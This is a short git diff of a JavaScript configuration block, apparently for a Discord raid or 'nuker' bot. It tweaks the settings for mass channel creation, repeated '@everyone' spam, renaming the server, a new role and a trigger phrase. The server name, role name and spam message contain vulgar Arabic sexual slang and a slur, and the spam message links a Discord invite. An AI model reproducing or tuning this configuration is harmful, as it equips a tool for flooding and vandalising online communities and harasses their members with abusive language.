@@ -4,13 +4,13 @@ const path = require('path');
 require('dotenv').config();
 
 let config = {
-    serverName: "اه اه نيك اه",
-    channelName: "Group 1923",
-    channelCount: 10000,
+    serverName: " اه اه نيك اه",
+    channelName: "Group 1922",
+    channelCount: 100,
     roleName: "نيك",
     iconPath: "./icon.png",
     spamMessage: "@everyone اعمامك هنا يا قحبه انت وياه https://discord.gg/6j5PVZqgBy",
-    spamCount: 250,
+    spamCount: 200,
     triggerWord: "شغل يا ريس"
 };
 
